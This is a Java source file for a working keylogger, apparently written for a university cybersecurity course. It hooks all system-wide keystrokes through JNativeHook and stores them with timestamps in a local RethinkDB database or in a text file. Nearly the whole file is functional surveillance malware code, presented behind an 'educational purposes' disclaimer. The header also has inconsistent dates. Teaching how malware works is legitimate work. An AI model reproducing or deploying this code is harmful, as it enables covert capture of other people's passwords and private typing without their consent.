/*
 * @author Waleed
 * @date 2024-01-16
 * @last-modified 2020-02-01
 * Disclaimer: This software is provided ONLY for educational purposes and does not constitute an inducement to commit fraud.
 * If you use this software for any illegal purpose, the author is NOT responsible for your actions or any damage that may result from your actions.
 * 
 * This code is a simple keylogger that records all keystrokes and writes them into a database. The main reason behind this project is to show how easy
 * is to write a keylogger and how dangerous it can be. The code is written in Java and uses JNativeHook library to capture keystrokes.
 * 
 * Purpose: Cybersecurity project for the Cybersecurity course at my university. This was part of a bigger presentation about malware.
 */

package com.keylogger;

import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;

import com.rethinkdb.RethinkDB;
import com.rethinkdb.net.Connection;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

enum Mode {
    DATABASE, 
    FILE,   // mainly to debug
    CONSOLE // mainly to debug
};

public class Keylogger {
    // DATABASE CONFIGURATION
    private static final String DB_NAME = "keylogger";
    private static final String DB_TABLE_NAME = "device1";
    private static final String DB_HOST = "localhost";
    private static final int DB_PORT = 28015;
    // FILE CONFIGURATION
    private static final String FILE_PATH = "keystrokes.txt";
    
    private static final Mode mode = Mode.DATABASE;
    private static final RethinkDB r = RethinkDB.r;
    private static Connection conn;

    private static void writeToDB(Stroke key) {
        if (key != null) {
            r.db(DB_NAME).table(DB_TABLE_NAME).insert(r.hashMap("timestamp", key.getTimestamp()).with("key", key.getKey())).run(conn);
        }
    }

    private static void writeToConsole(Stroke key) {
        if (key != null) {
            System.out.println(key.getTimestamp() + ": " + key.getKey());
        }
        
    }

    private static void writeToFile(Stroke key) {
        if (key != null) {
            try {
                FileWriter myWriter = new FileWriter(FILE_PATH, true);
                myWriter.write(key.getTimestamp() + ": " + key.getKey() + "\n");
                myWriter.close();
            } catch (IOException e) {
                System.out.println("An error occurred while writing to file.");
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {
        KeyListener keylistener = new KeyListener();
        try {
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
            GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(keylistener);
		} catch (Exception e) {
			e.printStackTrace();
            System.exit(1);
		}

        if (mode == Mode.DATABASE) {
            conn = r.connection().hostname(DB_HOST).port(DB_PORT).connect();
        }
        else if (mode == Mode.FILE) {
            try {
                File file = new File(FILE_PATH);
                file.createNewFile();
            } catch (IOException e) {
                System.out.println("An error occurred while creating the file.");
                e.printStackTrace();
                System.exit(1);
            }
        }

        while (true){
            Stroke key = keylistener.pollQueue();
            if (mode == Mode.DATABASE) {
                writeToDB(key);
            }
            else if (mode == Mode.FILE) {
                writeToFile(key);
            }
            else if (mode == Mode.CONSOLE) {
                writeToConsole(key);
            }
        }
    }
}
